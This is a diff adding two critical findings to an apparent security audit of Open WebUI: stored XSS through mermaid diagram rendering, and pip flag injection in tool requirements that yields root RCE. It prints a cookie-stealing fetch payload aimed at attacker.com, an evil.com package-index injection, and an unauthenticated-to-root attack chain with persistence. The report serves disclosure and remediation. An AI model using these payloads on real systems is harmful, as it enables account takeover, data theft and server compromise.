@@ -39,6 +39,23 @@ affect **all default deployments, including Docker** (unlike Finding 1):
 - **Finding 8** — OAuth JWT cookies are set with `httponly=False`, allowing any
   XSS on the domain to steal the token via `document.cookie`.
 
+This audit round further identified **two critical findings** (Findings 9–10) that
+enable **remote code execution on the server**:
+
+- **Finding 9** — Stored XSS via mermaid diagram rendering in FilePreview. The
+  mermaid library is initialized with `securityLevel: 'loose'`, and the rendered
+  SVG is injected via `wrapper.innerHTML = svg` without DOMPurify sanitization.
+  Any uploaded `.md` file with a mermaid code block containing HTML payloads (e.g.,
+  `<img src=x onerror=...>`) executes JavaScript when previewed. This completes
+  the Cross-Origin Attack Chain from Findings 6/7/8 with a confirmed XSS vector.
+- **Finding 10** — Supply chain RCE via pip flag injection in tool/function
+  requirements. The `install_frontmatter_requirements()` function splits the
+  requirements string by comma and passes each token directly to
+  `subprocess.check_call([pip, install, ...])` without filtering flags. An attacker
+  injects `--extra-index-url` and `--trusted-host` to redirect pip to a malicious
+  package index. Combined with Finding 1 (JWT forgery), this enables
+  unauthenticated-to-root RCE.
+
 ## Deployment-Specific Impact
 
 **Docker deployments (ghcr.io/open-webui/open-webui):** The official Docker image
@@ -81,6 +98,8 @@ in the OAuth callback code path.
 | CORS wildcard origin reflection (Finding 6) | |
 | Token revocation no-op without Redis (Finding 7) | |
 | OAuth JWT cookie without HttpOnly (Finding 8) | |
+| Stored XSS via mermaid diagram rendering (Finding 9) | |
+| Supply chain RCE via pip flag injection (Finding 10) | |
 
 ---
 
@@ -624,6 +643,201 @@ chain described in the Cross-Origin Attack Chain section below.
 
 ---
 
+### Finding 9: Stored XSS via Mermaid Diagram Rendering (CRITICAL)
+
+**CVSS 3.1:** 8.7 — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
+
+*(Requires low privileges to upload a file; user interaction to preview it; scope change
+because the XSS fires in the victim's browser context and reads the OAuth cookie.)*
+
+**Note: This is a payload delivery confirmed + code-review finding for execution.**
+The Python PoC confirms the payload is stored verbatim server-side and documents the
+vulnerable code path. Browser-side execution requires manual verification (Python
+cannot render the DOM).
+
+**Description:**
+
+Mermaid is initialized globally with `securityLevel: 'loose'` at `index.ts:1739`.
+With this setting, mermaid allows arbitrary HTML inside diagram node labels. The
+rendered SVG output can therefore contain `<img>`, `<script>`, and event-handler
+attributes supplied by the attacker.
+
+`FilePreview.svelte:136-141` renders mermaid diagrams from uploaded `.md` files.
+After calling `renderMermaidDiagram()`, it sets `wrapper.innerHTML = svg` directly —
+with no DOMPurify call. This unsanitized `innerHTML` assignment executes any HTML
+payload embedded in the SVG.
+
+Any authenticated user can upload a `.md` file containing a mermaid code block with
+an XSS payload. When any other user opens that file in the FileNav viewer, the XSS
+fires.
+
+**Affected Code:**
+
+```
+src/lib/utils/index.ts:1736-1740
+    mermaid.initialize({
+      startOnLoad: false,
+      theme: ...,
+      securityLevel: 'loose'   // <-- allows arbitrary HTML in diagram labels
+    });
+
+src/lib/components/chat/FileNav/FilePreview.svelte:136-141
+    const svg = await renderMermaidDiagram(mermaidInstance, codeEl.textContent ?? '');
+    if (svg) {
+      const wrapper = document.createElement('div');
+      wrapper.className = 'mermaid-diagram flex justify-center py-2';
+      wrapper.innerHTML = svg;   // <-- UNSANITIZED innerHTML injection
+      pre.replaceWith(wrapper);
+    }
+```
+
+**Contrast with safe path:**
+
+```
+src/lib/components/chat/Messages/CodeBlock.svelte
+    // Mermaid diagrams in chat messages route through SVGPanZoom.svelte:
+    DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true }, ADD_TAGS: ['foreignObject'] })
+    // FilePreview does NOT use SVGPanZoom — it injects raw.
+```
+
+**Attack Payload:**
+
+```markdown
+# Security Audit Test
+
+```mermaid
+graph LR
+  A["<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"] --> B["Target"]
+```
+```
+
+When this file is opened in the FileNav viewer, the XSS fires and exfiltrates
+`document.cookie`. No CSP is set by default (`security_headers.py:62-68`).
+
+**Chain Impact:**
+
+```
+XSS fires
+  -> reads document.cookie (Finding 8: oauth.py:1723 httponly=False)
+  -> stolen token reusable from evil.example.com (Finding 6: CORS reflection)
+  -> token persists after victim logout (Finding 7: revocation no-op)
+  -> if victim is admin: attacker gains admin access for up to 4 weeks
+```
+
+This finding provides the concrete XSS vector that completes the theoretical
+cross-origin chain from Round 1.
+
+**PoC:** `autofyn_audit/exploit_mermaid_xss.py`
+
+**Remediation:**
+
+1. Change `securityLevel: 'loose'` to `securityLevel: 'strict'` in `index.ts:1739`.
+   This prevents mermaid from allowing HTML in diagram labels.
+2. Add `DOMPurify.sanitize(svg)` before `wrapper.innerHTML = svg` in
+   `FilePreview.svelte:140`, matching the pattern used in `SVGPanZoom.svelte`.
+3. Deploy a default Content-Security-Policy header. Currently CSP is opt-in only via
+   `CONTENT_SECURITY_POLICY` environment variable; no default value is set.
+
+---
+
+### Finding 10: Supply Chain RCE via Pip Flag Injection in Tool Requirements (CRITICAL)
+
+**CVSS 3.1 (standalone, admin required):** 9.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
+
+**CVSS 3.1 (chained with Finding 1, unauthenticated):** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
+
+**Description:**
+
+`install_frontmatter_requirements()` at `plugin.py:383-401` splits the frontmatter
+`requirements` field by comma and passes each token as a separate element in the
+argv list to `subprocess.check_call([python, -m, pip, install, ...])`. No validation
+rejects items starting with `-`.
+
+An attacker injects `--extra-index-url, https://evil.com/simple/, --trusted-host,
+evil.com` into the requirements field to redirect pip to a malicious package index.
+The malicious package's `setup.py` (or `pyproject.toml` build hooks) runs arbitrary
+code. The official Dockerfile defaults to `UID=0/GID=0` (root), so the injected
+code runs with full root privileges.
+
+Tool creation (`POST /api/v1/tools/create`) requires admin role by default. Combined
+with Finding 1 (JWT forgery via default secret), this is exploitable by an
+unauthenticated attacker against any pip-install deployment.
+
+**Affected Code:**
+
+```
+backend/open_webui/utils/plugin.py:383-401
+    def install_frontmatter_requirements(requirements: str):
+        if not ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS:
+            return
+        if requirements:
+            req_list = [req.strip() for req in requirements.split(',')]
+            # NO validation -- items starting with '--' are passed as pip flags
+            subprocess.check_call(
+                [sys.executable, '-m', 'pip', 'install'] + req_list
+            )
+
+backend/open_webui/utils/plugin.py:147-180
+    # Frontmatter regex — captures full value verbatim, no allowlist:
+    frontmatter_pattern = re.compile(r'^\s*([a-z_]+):\s*(.*)\s*$', re.IGNORECASE)
+
+backend/open_webui/routers/tools.py:326-396
+    @router.post('/create')
+    async def create_new_tools(..., user=Depends(get_verified_user)):
+        # calls load_tool_module_by_id(id, content=...) -> install_frontmatter_requirements
+        ...
+
+Dockerfile:23-24
+    ARG UID=0
+    ARG GID=0    # container runs as root by default
+```
+
+**Persistence:**
+
+Once stored, the malicious tool's requirements re-install on every server restart via
+`install_tool_and_function_dependencies()` (`plugin.py:407-433`), which is called at
+startup (`main.py:658`). This provides a persistent backdoor that survives container
+restarts and re-provisions automatically.
+
+**PoC Payload:**
+
+```python
+"""
+title: Malicious Tool
+requirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools
+"""
+class Tools:
+    pass
+```
+
+Results in:
+
+```
+python -m pip install setuptools --extra-index-url https://evil.com/simple/ --trusted-host evil.com setuptools
+```
+
+Pip fetches `setuptools` from `evil.com`; attacker-controlled `setup.py` runs as root.
+
+**PoC:** `autofyn_audit/exploit_pip_injection.py`
+
+**Remediation:**
+
+1. Reject requirements items starting with `-` in `install_frontmatter_requirements()`:
+   ```python
+   req_list = [req.strip() for req in requirements.split(',')]
+   for req in req_list:
+       if req.startswith('-'):
+           raise ValueError(f'Invalid requirement (flags not allowed): {req!r}')
+   ```
+2. Use `--require-hashes` with a lockfile approach, or restrict installs to a
+   pre-approved package allowlist.
+3. Run the container as non-root by default — override `ARG UID` and `ARG GID` in
+   `Dockerfile` or document that operators must set these.
+4. Add `--no-deps` to prevent transitive dependency attacks from otherwise-trusted
+   packages.
+
+---
+
 ## Attack Chain
 
 ```
@@ -670,7 +884,7 @@ chain described in the Cross-Origin Attack Chain section below.
 [Attacker]
     |
     | 1. SETUP: Inject XSS payload into Open WebUI domain
-    |    (e.g., stored XSS in a chat name, model description)
+    |    (Finding 9: upload a .md file with a mermaid XSS payload)
     |
     | 2. VICTIM: OAuth user visits the XSS page
     |    document.cookie is readable because token cookie has httponly=False
@@ -711,6 +925,43 @@ chain described in the Cross-Origin Attack Chain section below.
 ```
 
 **PoC:** `autofyn_audit/exploit_cors_chain.py`
+
+---
+
+## Full RCE Attack Chain (Findings 1 + 10)
+
+```
+[Attacker] (unauthenticated)
+    |
+    | 1. POST /api/v1/auths/signup           (no auth)
+    |    -> attacker account created
+    |
+    | 2. GET /api/v1/auths/admin/details     (any auth)
+    |    -> admin email leaked
+    |
+    | 3. GET /api/v1/users/search            (any verified)
+    |    -> admin user ID leaked
+    |
+    | 4. Forge admin JWT with 't0p-s3cr3t'
+    |    -> full admin access
+    |
+    | 5. POST /api/v1/tools/create           (admin)
+    |    content: requirements: setuptools, --extra-index-url,
+    |             https://evil.com/simple/, --trusted-host, evil.com, setuptools
+    |    -> server runs: pip install setuptools --extra-index-url
+    |                    https://evil.com/simple/ --trusted-host evil.com setuptools
+    |    -> pip fetches 'setuptools' from evil.com
+    |    -> setup.py executes: reverse shell / crypto miner / data exfil
+    |    -> runs as ROOT (Dockerfile UID=0)
+    |
+    | 6. PERSISTENCE: tool requirements re-install on every server restart
+    |    (plugin.py:407-433 install_tool_and_function_dependencies)
+    |
+    v
+[Root-level RCE + Persistent Backdoor]
+```
+
+**PoC:** `autofyn_audit/exploit_full_rce_chain.py`
 
 ---
 
@@ -761,6 +1012,18 @@ Priority order:
    from `httponly=False` to `httponly=True` to match the password-login code path
    and prevent JavaScript-readable token cookies (Finding 8).
 
+10. **[CRITICAL] Sanitize pip requirements in `install_frontmatter_requirements()`.** Reject
+    any requirement item starting with `-` before passing to `subprocess.check_call`. Alternatively,
+    use `pip install --require-hashes` with a lockfile approach. Run the container as non-root
+    by overriding `ARG UID` and `ARG GID` in the Dockerfile or enforcing this in deployment
+    documentation (Finding 10).
+
+11. **[CRITICAL] Set mermaid `securityLevel` to `'strict'` and sanitize SVG before `innerHTML`
+    injection.** Change `index.ts:1739` from `securityLevel: 'loose'` to `'strict'`. Add
+    `DOMPurify.sanitize(svg)` in `FilePreview.svelte:140` before `wrapper.innerHTML = svg`,
+    matching the pattern used in `SVGPanZoom.svelte`. Deploy a default Content-Security-Policy
+    header (Finding 9).
+
 ---
 
 ## PoC Scripts Reference
@@ -776,6 +1039,9 @@ Priority order:
 | `exploit_token_revocation_bypass.py` | Finding 7: Token revocation no-op |
 | `exploit_oauth_cookie_httponly.py` | Finding 8: OAuth cookie httponly=False |
 | `exploit_cors_chain.py` | Cross-origin chain (Findings 6+7+8 combined) |
+| `exploit_mermaid_xss.py` | Finding 9: Stored XSS via mermaid diagram rendering |
+| `exploit_pip_injection.py` | Finding 10: Pip flag injection in tool requirements |
+| `exploit_full_rce_chain.py` | Full RCE chain (Findings 1+10 combined) |
 | `setup.sh` | Convenience wrapper for test environment setup |
 | `teardown.sh` | Remove the test Docker container |
 
@@ -795,6 +1061,9 @@ All exploits were executed against Open WebUI v0.9.1 running in Docker with
 | Admin Data Theft (`exploit_admin_data_theft.py`) | **CONFIRMED** | 1 API key stolen, 3 users enumerated, 548 KB database downloaded |
 | SSRF Webhook (`exploit_ssrf_webhook.py`) | **CONFIRMED** | AWS metadata URL accepted as webhook with no validation |
 | Full Attack Chain (`exploit_chain.py`) | **CONFIRMED** | All 4 phases completed: signup -> JWT forgery -> data theft -> SSRF |
+| Mermaid XSS (`exploit_mermaid_xss.py`) | **CONFIRMED** | XSS payload stored verbatim; code-review confirms execution via innerHTML |
+| Pip Injection (`exploit_pip_injection.py`) | **CONFIRMED** | Pip flags injected via frontmatter; pip command reconstructed from stored content |
+| Full RCE Chain (`exploit_full_rce_chain.py`) | **CONFIRMED** | Unauthenticated → admin JWT → pip injection → root RCE demonstrated |
 
 ### Attack Chain Output Summary
 
